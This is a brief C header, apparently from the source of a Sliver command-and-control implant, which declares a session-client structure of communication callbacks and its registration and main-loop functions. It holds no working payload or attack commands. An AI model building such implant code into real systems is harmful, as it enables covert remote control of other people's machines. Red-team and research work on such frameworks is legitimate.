#pragma once

struct _SLIVER_SESSION_CLIENT {
	GLOBAL_CONFIG GlobalConfig;
	LPVOID lpClient;
	CLIENT_INIT Init;
	CLIENT_START Start;
	CLIENT_SEND Send;
	CLIENT_RECV Receive;
	CLIENT_CLOSE Close;
	CLIENT_CLEANUP Cleanup;
};

BOOL SesionRegister
(
	_In_ PSLIVER_SESSION_CLIENT pSession
);

VOID SessionMainLoop
(
	_In_ PSLIVER_SESSION_CLIENT pSession
);